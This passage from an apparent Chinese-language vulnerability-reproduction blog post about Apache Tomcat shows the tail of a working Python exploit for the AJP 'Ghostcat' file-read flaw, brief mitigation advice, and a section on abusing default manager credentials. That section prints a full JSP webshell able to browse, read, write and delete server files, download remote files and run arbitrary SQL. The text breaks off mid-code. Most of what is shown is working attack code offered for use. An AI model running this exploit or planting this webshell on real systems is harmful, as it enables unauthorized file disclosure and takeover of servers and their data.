r.prefix_code == AjpResponse.SEND_HEADERS</span><br><span class="line">res.append(r)</span><br><span class="line">if save_cookies and &#x27;Set-Cookie&#x27; in r.response_headers:</span><br><span class="line">self.headers[&#x27;SC_REQ_COOKIE&#x27;] = r.response_headers[&#x27;Set-Cookie&#x27;]</span><br><span class="line"></span><br><span class="line"># read body chunks and end response packets</span><br><span class="line">while True:</span><br><span class="line">r = AjpResponse.receive(stream)</span><br><span class="line">res.append(r)</span><br><span class="line">if r.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line">break</span><br><span class="line">elif r.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><br><span class="line">continue</span><br><span class="line">else:</span><br><span class="line">raise NotImplementedError</span><br><span class="line">break</span><br><span class="line"></span><br><span class="line">return res</span><br><span class="line"></span><br><span class="line">class AjpResponse(object):</span><br><span class="line">_,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(7)</span><br><span class="line">COMMON_SEND_HEADERS = [</span><br><span class="line">&quot;Content-Type&quot;, &quot;Content-Language&quot;, &quot;Content-Length&quot;, &quot;Date&quot;, &quot;Last-Modified&quot;,</span><br><span class="line">&quot;Location&quot;, &quot;Set-Cookie&quot;, &quot;Set-Cookie2&quot;, &quot;Servlet-Engine&quot;, &quot;Status&quot;, &quot;WWW-Authenticate&quot;</span><br><span class="line">]</span><br><span class="line">def parse(self, stream):</span><br><span class="line"># read headers</span><br><span class="line">self.magic, self.data_length, self.prefix_code = unpack(stream, &quot;&gt;HHb&quot;)</span><br><span class="line"></span><br><span class="line">if self.prefix_code == AjpResponse.SEND_HEADERS:</span><br><span class="line">self.parse_send_headers(stream)</span><br><span class="line">elif self.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><br><span class="line">self.parse_send_body_chunk(stream)</span><br><span class="line">elif self.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line">self.parse_end_response(stream)</span><br><span class="line">elif self.prefix_code == AjpResponse.GET_BODY_CHUNK:</span><br><span class="line">self.parse_get_body_chunk(stream)</span><br><span class="line">else:</span><br><span class="line">raise NotImplementedError</span><br><span class="line"></span><br><span class="line">def parse_send_headers(self, stream):</span><br><span class="line">self.http_status_code, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">self.http_status_msg = unpack_string(stream)</span><br><span class="line">self.num_headers, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">self.response_headers = &#123;&#125;</span><br><span class="line">for i in range(self.num_headers):</span><br><span class="line">code, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">if code &lt;= 0xA000: # custom header</span><br><span class="line">h_name, = unpack(stream, &quot;%ds&quot; % code)</span><br><span class="line">stream.read(1) # \0</span><br><span class="line">h_value = unpack_string(stream)</span><br><span class="line">else:</span><br><span class="line">h_name = AjpResponse.COMMON_SEND_HEADERS[code-0xA001]</span><br><span class="line">h_value = unpack_string(stream)</span><br><span class="line">self.response_headers[h_name] = h_value</span><br><span class="line"></span><br><span class="line">def parse_send_body_chunk(self, stream):</span><br><span class="line">self.data_length, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">self.data = stream.read(self.data_length+1)</span><br><span class="line"></span><br><span class="line">def parse_end_response(self, stream):</span><br><span class="line">self.reuse, = unpack(stream, &quot;b&quot;)</span><br><span class="line"></span><br><span class="line">def parse_get_body_chunk(self, stream):</span><br><span class="line">rlen, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">return rlen</span><br><span class="line"></span><br><span class="line">@staticmethod</span><br><span class="line">def receive(stream):</span><br><span class="line">r = AjpResponse()</span><br><span class="line">r.parse(stream)</span><br><span class="line">return r</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):</span><br><span class="line">fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)</span><br><span class="line">fr.method = method</span><br><span class="line">fr.protocol = &quot;HTTP/1.1&quot;</span><br><span class="line">fr.req_uri = req_uri</span><br><span class="line">fr.remote_addr = target_host</span><br><span class="line">fr.remote_host = None</span><br><span class="line">fr.server_name = target_host</span><br><span class="line">fr.server_port = 80</span><br><span class="line">fr.request_headers = &#123;</span><br><span class="line">&#x27;SC_REQ_ACCEPT&#x27;: &#x27;text/html&#x27;,</span><br><span class="line">&#x27;SC_REQ_CONNECTION&#x27;: &#x27;keep-alive&#x27;,</span><br><span class="line">&#x27;SC_REQ_CONTENT_LENGTH&#x27;: &#x27;0&#x27;,</span><br><span class="line">&#x27;SC_REQ_HOST&#x27;: target_host,</span><br><span class="line">&#x27;SC_REQ_USER_AGENT&#x27;: &#x27;Mozilla&#x27;,</span><br><span class="line">&#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate, sdch&#x27;,</span><br><span class="line">&#x27;Accept-Language&#x27;: &#x27;en-US,en;q=0.5&#x27;,</span><br><span class="line">&#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;,</span><br><span class="line">&#x27;Cache-Control&#x27;: &#x27;max-age=0&#x27;</span><br><span class="line">&#125;</span><br><span class="line">fr.is_ssl = False</span><br><span class="line">fr.attributes = []</span><br><span class="line">return fr</span><br><span class="line"></span><br><span class="line">class Tomcat(object):</span><br><span class="line">def __init__(self, target_host, target_port):</span><br><span class="line">self.target_host = target_host</span><br><span class="line">self.target_port = target_port</span><br><span class="line"></span><br><span class="line">self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">self.socket.connect((target_host, target_port))</span><br><span class="line">self.stream = self.socket.makefile(&quot;rb&quot;, buffering=0)</span><br><span class="line"></span><br><span class="line">def perform_request(self, req_uri, headers=&#123;&#125;, method=&#x27;GET&#x27;, user=None, password=None, attributes=[]):</span><br><span class="line">self.req_uri = req_uri</span><br><span class="line">self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))</span><br><span class="line">print(&quot;Getting resource at ajp13://%s:%d%s&quot; % (self.target_host, self.target_port, req_uri))</span><br><span class="line">if user is not None and password is not None:</span><br><span class="line">self.forward_request.request_headers[&#x27;SC_REQ_AUTHORIZATION&#x27;] = &quot;Basic &quot; + (&quot;%s:%s&quot; % (user, password)).encode(&#x27;base64&#x27;).replace(&#x27;\n&#x27;, &#x27;&#x27;)</span><br><span class="line">for h in headers:</span><br><span class="line">self.forward_request.request_headers[h] = headers[h]</span><br><span class="line">for a in attributes:</span><br><span class="line">self.forward_request.attributes.append(a)</span><br><span class="line">responses = self.forward_request.send_and_receive(self.socket, self.stream)</span><br><span class="line">if len(responses) == 0:</span><br><span class="line">return None, None</span><br><span class="line">snd_hdrs_res = responses[0]</span><br><span class="line">data_res = responses[1:-1]</span><br><span class="line">if len(data_res) == 0:</span><br><span class="line">print(&quot;No data in response. Headers:%s\n&quot; % snd_hdrs_res.response_headers)</span><br><span class="line">return snd_hdrs_res, data_res</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">javax.servlet.include.request_uri</span><br><span class="line">javax.servlet.include.path_info</span><br><span class="line">javax.servlet.include.servlet_path</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">import argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(&quot;target&quot;, type=str, help=&quot;Hostname or IP to attack&quot;)</span><br><span class="line">parser.add_argument(&#x27;-p&#x27;, &#x27;--port&#x27;, type=int, default=8009, help=&quot;AJP port to attack (default is 8009)&quot;)</span><br><span class="line">parser.add_argument(&quot;-f&quot;, &#x27;--file&#x27;, type=str, default=&#x27;WEB-INF/web.xml&#x27;, help=&quot;file path :(WEB-INF/web.xml)&quot;)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">t = Tomcat(args.target, args.port)</span><br><span class="line">_,data = t.perform_request(&#x27;/asdf&#x27;,attributes=[</span><br><span class="line">    &#123;&#x27;name&#x27;:&#x27;req_attribute&#x27;,&#x27;value&#x27;:[&#x27;javax.servlet.include.request_uri&#x27;,&#x27;/&#x27;]&#125;,</span><br><span class="line">    &#123;&#x27;name&#x27;:&#x27;req_attribute&#x27;,&#x27;value&#x27;:[&#x27;javax.servlet.include.path_info&#x27;,args.file]&#125;,</span><br><span class="line">    &#123;&#x27;name&#x27;:&#x27;req_attribute&#x27;,&#x27;value&#x27;:[&#x27;javax.servlet.include.servlet_path&#x27;,&#x27;/&#x27;]&#125;,</span><br><span class="line">    ])</span><br><span class="line">print(&#x27;----------------------------&#x27;)</span><br><span class="line">print(&quot;&quot;.join([str(d.data) for d in data]))</span><br></pre></td></tr></table></figure><blockquote><p>漏洞分析链接 </p><p><a href="https://mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ">https://mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ</a></p></blockquote><h4 id="5、修复建议-1"><a href="#5、修复建议-1" class="headerlink" title="5、修复建议"></a>5、修复建议</h4><ul><li><p>临时禁用AJP协议端口，在conf&#x2F;server.xml配置文件中注释掉<code>&lt;Connector port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot;redirectPort=&quot;8443&quot; /&gt;</code></p></li><li><p>配置ajp配置中的secretRequired跟secret属性来限制认证</p></li><li><p>升级版本</p></li></ul><h3 id="Tomcat7-弱口令-amp-amp-后台getshell漏洞"><a href="#Tomcat7-弱口令-amp-amp-后台getshell漏洞" class="headerlink" title="Tomcat7+ 弱口令 &amp;&amp; 后台getshell漏洞"></a>Tomcat7+ 弱口令 &amp;&amp; 后台getshell漏洞</h3><h4 id="1、漏洞原理"><a href="#1、漏洞原理" class="headerlink" title="1、漏洞原理"></a>1、漏洞原理</h4><blockquote><p>在tomcat8环境下默认进入后台的密码为tomcat&#x2F;tomcat，未修改造成未授权即可进入后台，或者管理员把密码设置成弱口令， 使用工具对其进行穷举。得到密码后，也可以进行后台上传恶意代码控制服务器。</p></blockquote><p>在<code>conf/tomcat-users.xml</code>文件中配置用户的权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;tomcat-users xmlns=&quot;http://tomcat.apache.org/xml&quot;</span><br><span class="line">              xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">              xsi:schemaLocation=&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span><br><span class="line">              version=&quot;1.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;role rolename=&quot;manager-gui&quot;/&gt;</span><br><span class="line">    &lt;role rolename=&quot;manager-script&quot;/&gt;</span><br><span class="line">    &lt;role rolename=&quot;manager-jmx&quot;/&gt;</span><br><span class="line">    &lt;role rolename=&quot;manager-status&quot;/&gt;</span><br><span class="line">    &lt;role rolename=&quot;admin-gui&quot;/&gt;</span><br><span class="line">    &lt;role rolename=&quot;admin-script&quot;/&gt;</span><br><span class="line">    &lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot; /&gt;</span><br><span class="line">    </span><br><span class="line">&lt;/tomcat-users&gt;</span><br></pre></td></tr></table></figure><p>正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。</p><h4 id="2、漏洞复现"><a href="#2、漏洞复现" class="headerlink" title="2、漏洞复现"></a>2、漏洞复现</h4><p><code>docker-compose up -d</code></p><p>访问网址：<code>http://xxx:8080/</code>，即可看到Tomcat界面</p><p>访问<code>http://xxx:8080/manager/html</code>输入账号和密码 tomcat</p><p><img src="http://image.jh2ing.com/image-20221118132313319.png" alt="image-20221118132313319"></p><p><strong>一句话木马：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@page import=&quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&quot;%&gt;</span><br><span class="line">&lt;%!String Pwd = &quot;pass&quot;;</span><br><span class="line"></span><br><span class="line">    String EC(String s, String c) throws Exception &#123;</span><br><span class="line">        return s;</span><br><span class="line">    &#125;//new String(s.getBytes(&quot;ISO-8859-1&quot;),c);&#125;</span><br><span class="line"></span><br><span class="line">    Connection GC(String s) throws Exception &#123;</span><br><span class="line">        String[] x = s.trim().split(&quot;\r\n&quot;);</span><br><span class="line">        Class.forName(x[0].trim()).newInstance();</span><br><span class="line">        Connection c = DriverManager.getConnection(x[1].trim());</span><br><span class="line">        if (x.length &gt; 2) &#123;</span><br><span class="line">            c.setCatalog(x[2].trim());</span><br><span class="line">        &#125;</span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void AA(StringBuffer sb) throws Exception &#123;</span><br><span class="line">        File r[] = File.listRoots();</span><br><span class="line">        for (int i = 0; i &lt; r.length; i++) &#123;</span><br><span class="line">            sb.append(r[i].toString().substring(0, 2));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void BB(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        File oF = new File(s), l[] = oF.listFiles();</span><br><span class="line">        String sT, sQ, sF = &quot;&quot;;</span><br><span class="line">        java.util.Date dt;</span><br><span class="line">        SimpleDateFormat fm = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);</span><br><span class="line">        for (int i = 0; i &lt; l.length; i++) &#123;</span><br><span class="line">            dt = new java.util.Date(l[i].lastModified());</span><br><span class="line">            sT = fm.format(dt);</span><br><span class="line">            sQ = l[i].canRead() ? &quot;R&quot; : &quot;&quot;;</span><br><span class="line">            sQ += l[i].canWrite() ? &quot; W&quot; : &quot;&quot;;</span><br><span class="line">            if (l[i].isDirectory()) &#123;</span><br><span class="line">                sb.append(l[i].getName() + &quot;/\t&quot; + sT + &quot;\t&quot; + l[i].length()</span><br><span class="line">                        + &quot;\t&quot; + sQ + &quot;\n&quot;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                sF += l[i].getName() + &quot;\t&quot; + sT + &quot;\t&quot; + l[i].length() + &quot;\t&quot;</span><br><span class="line">                        + sQ + &quot;\n&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sb.append(sF);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void EE(String s) throws Exception &#123;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        if (f.isDirectory()) &#123;</span><br><span class="line">            File x[] = f.listFiles();</span><br><span class="line">            for (int k = 0; k &lt; x.length; k++) &#123;</span><br><span class="line">                if (!x[k].delete()) &#123;</span><br><span class="line">                    EE(x[k].getPath());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        f.delete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void FF(String s, HttpServletResponse r) throws Exception &#123;</span><br><span class="line">        int n;</span><br><span class="line">        byte[] b = new byte[512];</span><br><span class="line">        r.reset();</span><br><span class="line">        ServletOutputStream os = r.getOutputStream();</span><br><span class="line">        BufferedInputStream is = new BufferedInputStream(new FileInputStream(s));</span><br><span class="line">        os.write((&quot;-&gt;&quot; + &quot;|&quot;).getBytes(), 0, 3);</span><br><span class="line">        while ((n = is.read(b, 0, 512)) != -1) &#123;</span><br><span class="line">            os.write(b, 0, n);</span><br><span class="line">        &#125;</span><br><span class="line">        os.write((&quot;|&quot; + &quot;&lt;-&quot;).getBytes(), 0, 3);</span><br><span class="line">        os.close();</span><br><span class="line">        is.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void GG(String s, String d) throws Exception &#123;</span><br><span class="line">        String h = &quot;0123456789ABCDEF&quot;;</span><br><span class="line">        int n;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        f.createNewFile();</span><br><span class="line">        FileOutputStream os = new FileOutputStream(f);</span><br><span class="line">        for (int i = 0; i &lt; d.length(); i += 2) &#123;</span><br><span class="line">            os</span><br><span class="line">                    .write((h.indexOf(d.charAt(i)) &lt;&lt; 4 | h.indexOf(d</span><br><span class="line">                            .charAt(i + 1))));</span><br><span class="line">        &#125;</span><br><span class="line">        os.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void HH(String s, String d) throws Exception &#123;</span><br><span class="line">        File sf = new File(s), df = new File(d);</span><br><span class="line">        if (sf.isDirectory()) &#123;</span><br><span class="line">            if (!df.exists()) &#123;</span><br><span class="line">                df.mkdir();</span><br><span class="line">            &#125;</span><br><span class="line">            File z[] = sf.listFiles();</span><br><span class="line">            for (int j = 0; j &lt; z.length; j++) &#123;</span><br><span class="line">                HH(s + &quot;/&quot; + z[j].getName(), d + &quot;/&quot; + z[j].getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            FileInputStream is = new FileInputStream(sf);</span><br><span class="line">            FileOutputStream os = new FileOutputStream(df);</span><br><span class="line">            int n;</span><br><span class="line">            byte[] b = new byte[512];</span><br><span class="line">            while ((n = is.read(b, 0, 512)) != -1) &#123;</span><br><span class="line">                os.write(b, 0, n);</span><br><span class="line">            &#125;</span><br><span class="line">            is.close();</span><br><span class="line">            os.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void II(String s, String d) throws Exception &#123;</span><br><span class="line">        File sf = new File(s), df = new File(d);</span><br><span class="line">        sf.renameTo(df);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void JJ(String s) throws Exception &#123;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        f.mkdir();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void KK(String s, String t) throws Exception &#123;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        SimpleDateFormat fm = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);</span><br><span class="line">        java.util.Date dt = fm.parse(t);</span><br><span class="line">        f.setLastModified(dt.getTime());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void LL(String s, String d) throws Exception &#123;</span><br><span class="line">        URL u = new URL(s);</span><br><span class="line">        int n;</span><br><span class="line">        FileOutputStream os = new FileOutputStream(d);</span><br><span class="line">        HttpURLConnection h = (HttpURLConnection) u.openConnection();</span><br><span class="line">        InputStream is = h.getInputStream();</span><br><span class="line">        byte[] b = new byte[512];</span><br><span class="line">        while ((n = is.read(b, 0, 512)) != -1) &#123;</span><br><span class="line">            os.write(b, 0, n);</span><br><span class="line">        &#125;</span><br><span class="line">        os.close();</span><br><span class="line">        is.close();</span><br><span class="line">        h.disconnect();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void MM(InputStream is, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        String l;</span><br><span class="line">        BufferedReader br = new BufferedReader(new InputStreamReader(is));</span><br><span class="line">        while ((l = br.readLine()) != null) &#123;</span><br><span class="line">            sb.append(l + &quot;\r\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void NN(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        ResultSet r = c.getMetaData().getCatalogs();</span><br><span class="line">        while (r.next()) &#123;</span><br><span class="line">            sb.append(r.getString(1) + &quot;\t&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        r.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void OO(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        String[] t = &#123; &quot;TABLE&quot; &#125;;</span><br><span class="line">        ResultSet r = c.getMetaData().getTables(null, null, &quot;%&quot;, t);</span><br><span class="line">        while (r.next()) &#123;</span><br><span class="line">            sb.append(r.getString(&quot;TABLE_NAME&quot;) + &quot;\t&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        r.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void PP(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        String[] x = s.trim().split(&quot;\r\n&quot;);</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        Statement m = c.createStatement(1005, 1007);</span><br><span class="line">        ResultSet r = m.executeQuery(&quot;select * from &quot; + x[3]);</span><br><span class="line">        ResultSetMetaData d = r.getMetaData();</span><br><span class="line">        for (int i = 1; i &lt;= d.getColumnCount(); i++) &#123;</span><br><span class="line">            sb.append(d.getColumnName(i) + &quot; (&quot; + d.getColumnTypeName(i)</span><br><span class="line">                    + &quot;)\t&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        r.close();</span><br><span class="line">        m.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void QQ(String cs, String s, String q, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        int i;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        Statement m = c.createStatement(1005, 1008);</span><br><span class="line">        try &#123;</span><br><span class="line">            ResultSet r = m.executeQuery(q);</span><br><span class="line">            ResultSetMetaData d = r.getMetaData();</span><br><span class="line">            int n = d.getColumnCount();</span><br><span class="line">            for (i = 1; i &lt;= n; i++) &#123;</span><br><span class="line">                sb.append(d.getColumnName(i) + &quot;\t|\t&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(&quot;\r\n&quot;);</span><br><span class="line">            while (r.next()) &#123;</span><br><span class="line">                for (i = 1; i &lt;= n; i++) &#123;</span><br><span class="line">                    sb.append(EC(r.getString(i), cs) + &quot;\t|\t&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                sb.append(&quot;\r\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            r.close();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            sb.append(&quot;Result\t|\t\r\n&quot;);</span><br><span class="line">            try &#123;</span><br><span class="line">                m.executeUpdate(q);</span><br><span class="line">                sb.append(&quot;Execute Successfully!\t|\t\r\n&quot;);</span><br><span class="line">            &#125; catch (Exception ee) &#123;</span><br><span class="line">                sb.append(ee.toString() + &quot;\t|\t\r\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        m.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;%&gt;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">&lt;%</span><br><span class="line">    String cs = 